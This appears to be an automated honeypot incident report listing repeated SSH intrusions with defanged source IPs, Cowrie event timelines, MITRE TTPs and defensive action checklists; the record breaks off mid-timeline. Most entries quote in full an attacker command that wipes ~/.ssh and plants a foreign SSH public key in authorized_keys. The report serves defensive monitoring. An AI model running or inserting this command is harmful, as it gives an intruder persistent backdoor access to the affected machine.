| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 13:59:16` | `cowrie.session.connect` |
| `2026-06-03 13:59:16` | `cowrie.client.version` |
| `2026-06-03 13:59:16` | `cowrie.client.kex` |
| `2026-06-03 13:59:17` | `cowrie.login.success` |
| `2026-06-03 13:59:18` | `cowrie.session.params` |
| `2026-06-03 13:59:18` | `cowrie.command.input` |
| `2026-06-03 13:59:18` | `cowrie.command.failed` |
| `2026-06-03 13:59:18` | `cowrie.log.closed` |
| `2026-06-03 13:59:19` | `cowrie.session.params` |
| `2026-06-03 13:59:19` | `cowrie.command.input` |
| `2026-06-03 13:59:19` | `cowrie.session.file_download` |
| `2026-06-03 13:59:19` | `cowrie.log.closed` |
| `2026-06-03 13:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273c826a569b

| Field | Detail |
|---|---|
| **Source IP** | `62.3.56[.]187` |
| **First Seen** | 2026-06-03 13:59 |
| **Last Seen** | 2026-06-03 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 13:59:22` | `cowrie.session.connect` |
| `2026-06-03 13:59:22` | `cowrie.client.version` |
| `2026-06-03 13:59:22` | `cowrie.client.kex` |
| `2026-06-03 13:59:23` | `cowrie.login.success` |
| `2026-06-03 13:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.3.56[.]187` to AbuseIPDB if not already reported
- [ ] Block `62.3.56[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92e35a4a0aa

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-06-03 14:29 |
| **Last Seen** | 2026-06-03 14:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:29:29` | `cowrie.session.connect` |
| `2026-06-03 14:29:29` | `cowrie.client.version` |
| `2026-06-03 14:29:29` | `cowrie.client.kex` |
| `2026-06-03 14:29:30` | `cowrie.login.success` |
| `2026-06-03 14:29:30` | `cowrie.session.params` |
| `2026-06-03 14:29:30` | `cowrie.command.input` |
| `2026-06-03 14:29:30` | `cowrie.command.failed` |
| `2026-06-03 14:29:31` | `cowrie.log.closed` |
| `2026-06-03 14:29:31` | `cowrie.session.params` |
| `2026-06-03 14:29:31` | `cowrie.command.input` |
| `2026-06-03 14:29:31` | `cowrie.session.file_download` |
| `2026-06-03 14:29:31` | `cowrie.log.closed` |
| `2026-06-03 14:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56a83aca3a7

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-06-03 14:29 |
| **Last Seen** | 2026-06-03 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:29:34` | `cowrie.session.connect` |
| `2026-06-03 14:29:34` | `cowrie.client.version` |
| `2026-06-03 14:29:34` | `cowrie.client.kex` |
| `2026-06-03 14:29:35` | `cowrie.login.success` |
| `2026-06-03 14:29:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c722e2a24b

| Field | Detail |
|---|---|
| **Source IP** | `101.126.95[.]172` |
| **First Seen** | 2026-06-03 14:42 |
| **Last Seen** | 2026-06-03 14:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:42:26` | `cowrie.session.connect` |
| `2026-06-03 14:42:26` | `cowrie.client.version` |
| `2026-06-03 14:42:26` | `cowrie.client.kex` |
| `2026-06-03 14:42:28` | `cowrie.login.success` |
| `2026-06-03 14:42:29` | `cowrie.session.params` |
| `2026-06-03 14:42:29` | `cowrie.command.input` |
| `2026-06-03 14:42:29` | `cowrie.command.failed` |
| `2026-06-03 14:42:29` | `cowrie.log.closed` |
| `2026-06-03 14:42:29` | `cowrie.session.params` |
| `2026-06-03 14:42:29` | `cowrie.command.input` |
| `2026-06-03 14:42:29` | `cowrie.session.file_download` |
| `2026-06-03 14:42:29` | `cowrie.log.closed` |
| `2026-06-03 14:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.95[.]172` to AbuseIPDB if not already reported
- [ ] Block `101.126.95[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b112460acd

| Field | Detail |
|---|---|
| **Source IP** | `101.126.95[.]172` |
| **First Seen** | 2026-06-03 14:42 |
| **Last Seen** | 2026-06-03 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:42:32` | `cowrie.session.connect` |
| `2026-06-03 14:42:32` | `cowrie.client.version` |
| `2026-06-03 14:42:32` | `cowrie.client.kex` |
| `2026-06-03 14:42:33` | `cowrie.login.success` |
| `2026-06-03 14:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.95[.]172` to AbuseIPDB if not already reported
- [ ] Block `101.126.95[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d674ca9356dd

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:45 |
| **Last Seen** | 2026-06-03 14:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:45:28` | `cowrie.session.connect` |
| `2026-06-03 14:45:28` | `cowrie.client.version` |
| `2026-06-03 14:45:29` | `cowrie.client.kex` |
| `2026-06-03 14:45:29` | `cowrie.login.success` |
| `2026-06-03 14:45:30` | `cowrie.session.params` |
| `2026-06-03 14:45:30` | `cowrie.command.input` |
| `2026-06-03 14:45:30` | `cowrie.command.failed` |
| `2026-06-03 14:45:30` | `cowrie.log.closed` |
| `2026-06-03 14:45:31` | `cowrie.session.params` |
| `2026-06-03 14:45:31` | `cowrie.command.input` |
| `2026-06-03 14:45:31` | `cowrie.session.file_download` |
| `2026-06-03 14:45:31` | `cowrie.log.closed` |
| `2026-06-03 14:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5ca6948aa1

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:45 |
| **Last Seen** | 2026-06-03 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:45:33` | `cowrie.session.connect` |
| `2026-06-03 14:45:33` | `cowrie.client.version` |
| `2026-06-03 14:45:34` | `cowrie.client.kex` |
| `2026-06-03 14:45:35` | `cowrie.login.success` |
| `2026-06-03 14:45:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0eeead22e86

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:46 |
| **Last Seen** | 2026-06-03 14:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:46:54` | `cowrie.session.connect` |
| `2026-06-03 14:46:54` | `cowrie.client.version` |
| `2026-06-03 14:46:54` | `cowrie.client.kex` |
| `2026-06-03 14:46:55` | `cowrie.login.success` |
| `2026-06-03 14:46:55` | `cowrie.session.params` |
| `2026-06-03 14:46:55` | `cowrie.command.input` |
| `2026-06-03 14:46:55` | `cowrie.command.failed` |
| `2026-06-03 14:46:55` | `cowrie.log.closed` |
| `2026-06-03 14:46:56` | `cowrie.session.params` |
| `2026-06-03 14:46:56` | `cowrie.command.input` |
| `2026-06-03 14:46:56` | `cowrie.session.file_download` |
| `2026-06-03 14:46:56` | `cowrie.log.closed` |
| `2026-06-03 14:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d88da3d16048

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:46 |
| **Last Seen** | 2026-06-03 14:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:46:58` | `cowrie.session.connect` |
| `2026-06-03 14:46:58` | `cowrie.client.version` |
| `2026-06-03 14:46:58` | `cowrie.client.kex` |
| `2026-06-03 14:46:59` | `cowrie.login.success` |
| `2026-06-03 14:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09306f5c183e

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:16` | `cowrie.session.connect` |
| `2026-06-03 14:47:16` | `cowrie.client.version` |
| `2026-06-03 14:47:16` | `cowrie.client.kex` |
| `2026-06-03 14:47:16` | `cowrie.login.success` |
| `2026-06-03 14:47:17` | `cowrie.session.params` |
| `2026-06-03 14:47:17` | `cowrie.command.input` |
| `2026-06-03 14:47:17` | `cowrie.command.failed` |
| `2026-06-03 14:47:17` | `cowrie.log.closed` |
| `2026-06-03 14:47:17` | `cowrie.session.params` |
| `2026-06-03 14:47:17` | `cowrie.command.input` |
| `2026-06-03 14:47:17` | `cowrie.session.file_download` |
| `2026-06-03 14:47:17` | `cowrie.log.closed` |
| `2026-06-03 14:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b859927345e

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:19` | `cowrie.session.connect` |
| `2026-06-03 14:47:19` | `cowrie.client.version` |
| `2026-06-03 14:47:20` | `cowrie.client.kex` |
| `2026-06-03 14:47:20` | `cowrie.login.success` |
| `2026-06-03 14:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e98e7d34eb5

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:22` | `cowrie.session.connect` |
| `2026-06-03 14:47:22` | `cowrie.client.version` |
| `2026-06-03 14:47:22` | `cowrie.client.kex` |
| `2026-06-03 14:47:23` | `cowrie.login.success` |
| `2026-06-03 14:47:24` | `cowrie.session.params` |
| `2026-06-03 14:47:24` | `cowrie.command.input` |
| `2026-06-03 14:47:24` | `cowrie.command.failed` |
| `2026-06-03 14:47:24` | `cowrie.log.closed` |
| `2026-06-03 14:47:24` | `cowrie.session.params` |
| `2026-06-03 14:47:24` | `cowrie.command.input` |
| `2026-06-03 14:47:24` | `cowrie.session.file_download` |
| `2026-06-03 14:47:24` | `cowrie.log.closed` |
| `2026-06-03 14:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9446fa3f238e

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:27` | `cowrie.session.connect` |
| `2026-06-03 14:47:27` | `cowrie.client.version` |
| `2026-06-03 14:47:27` | `cowrie.client.kex` |
| `2026-06-03 14:47:28` | `cowrie.login.success` |
| `2026-06-03 14:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6ade86a6d9

| Field | Detail |
|---|---|
| **Source IP** | `27.78.70[.]85` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:36` | `cowrie.session.connect` |
| `2026-06-03 14:47:36` | `cowrie.client.version` |
| `2026-06-03 14:47:36` | `cowrie.client.kex` |
| `2026-06-03 14:47:37` | `cowrie.login.success` |
| `2026-06-03 14:47:37` | `cowrie.session.params` |
| `2026-06-03 14:47:37` | `cowrie.command.input` |
| `2026-06-03 14:47:37` | `cowrie.command.failed` |
| `2026-06-03 14:47:37` | `cowrie.log.closed` |
| `2026-06-03 14:47:37` | `cowrie.session.params` |
| `2026-06-03 14:47:37` | `cowrie.command.input` |
| `2026-06-03 14:47:37` | `cowrie.session.file_download` |
| `2026-06-03 14:47:37` | `cowrie.log.closed` |
| `2026-06-03 14:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.78.70[.]85` to AbuseIPDB if not already reported
- [ ] Block `27.78.70[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00bcae523897

| Field | Detail |
|---|---|
| **Source IP** | `27.78.70[.]85` |
| **First Seen** | 2026-06-03 14:47 |
| **Last Seen** | 2026-06-03 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:47:39` | `cowrie.session.connect` |
| `2026-06-03 14:47:39` | `cowrie.client.version` |
| `2026-06-03 14:47:39` | `cowrie.client.kex` |
| `2026-06-03 14:47:40` | `cowrie.login.success` |
| `2026-06-03 14:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.78.70[.]85` to AbuseIPDB if not already reported
- [ ] Block `27.78.70[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506c8d00475c

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:48 |
| **Last Seen** | 2026-06-03 14:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:48:25` | `cowrie.session.connect` |
| `2026-06-03 14:48:25` | `cowrie.client.version` |
| `2026-06-03 14:48:25` | `cowrie.client.kex` |
| `2026-06-03 14:48:25` | `cowrie.login.success` |
| `2026-06-03 14:48:26` | `cowrie.session.params` |
| `2026-06-03 14:48:26` | `cowrie.command.input` |
